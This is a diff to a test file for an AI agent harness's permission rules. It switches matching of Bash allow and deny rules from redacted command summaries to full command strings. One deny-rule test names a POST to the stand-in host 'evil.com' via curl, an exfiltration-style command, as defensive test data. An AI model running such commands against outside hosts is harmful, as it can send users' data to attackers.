@@ -1,6 +1,5 @@
 import { describe, expect, it } from "vitest";
 import { rulesFromConfig } from "@innocenceharness/harness-permissions";
-import { redactCommandSummary } from "@innocenceharness/harness-tools";
 
 function vote(spec: string, kind: "allow" | "deny", call: { toolName: string; args: Record<string, unknown> }) {
   const rule = rulesFromConfig({ [kind]: [spec] })[0];
@@ -9,10 +8,10 @@ function vote(spec: string, kind: "allow" | "deny", call: { toolName: string; ar
 
 /**
  * Command rules are matched against the PERSISTED args tools actually store:
- * the redacted command summary (program word + shape-legal subcommands), not
- * the raw command. `bashArgs` mirrors what tools-shell's persistArgs emits.
+ * the full command string (no redaction — owner decision). `bashArgs` mirrors
+ * what tools-shell's persistArgs emits.
  */
-const bashArgs = (raw: string) => ({ toolName: "Bash", args: { command: redactCommandSummary(raw) } });
+const bashArgs = (raw: string) => ({ toolName: "Bash", args: { command: raw } });
 
 describe("project permission rule specs", () => {
   it("bare tool name matches every call of that tool", () => {
@@ -20,7 +19,7 @@ describe("project permission rule specs", () => {
     expect(vote("Read", "allow", { toolName: "Edit", args: {} })).toBe("skip");
   });
 
-  it("Bash(npm test) matches the persisted summary, not all npm", () => {
+  it("Bash(npm test) prefix-matches the persisted full command, not all npm", () => {
     expect(vote("Bash(npm test)", "allow", bashArgs("npm test"))).toBe("allow");
     expect(vote("Bash(npm test)", "allow", bashArgs("npm test -- -u"))).toBe("allow");
     expect(vote("Bash(npm test)", "allow", bashArgs("npm install"))).toBe("skip");
@@ -28,7 +27,7 @@ describe("project permission rule specs", () => {
     expect(vote("Bash(npm test)", "allow", bashArgs("npm publish"))).toBe("skip");
   });
 
-  it("Bash deny rules keep working against the persisted summary", () => {
+  it("Bash deny rules keep working against the persisted full command", () => {
     expect(vote("Bash(curl evil.com)", "deny", bashArgs("curl evil.com -X POST"))).toBe("deny");
     expect(vote("Bash(curl evil.com)", "deny", bashArgs("curl docs.example.com"))).toBe("skip");
   });
@@ -38,8 +37,8 @@ describe("project permission rule specs", () => {
     expect(vote("Bash(npm run *)", "allow", bashArgs("npm run"))).toBe("skip");
   });
 
-  it("commands whose summary is redacted never match parameterized rules", () => {
-    expect(vote("Bash(npm test)", "allow", bashArgs("npm"))).toBe("skip"); // pattern longer than summary
+  it("rules only prefix-match from the command's first token", () => {
+    expect(vote("Bash(npm test)", "allow", bashArgs("npm"))).toBe("skip"); // pattern longer than command
     expect(vote("Bash(npm test)", "allow", bashArgs(`--token=${"x".repeat(20)} npm test`))).toBe("skip");
   });
 
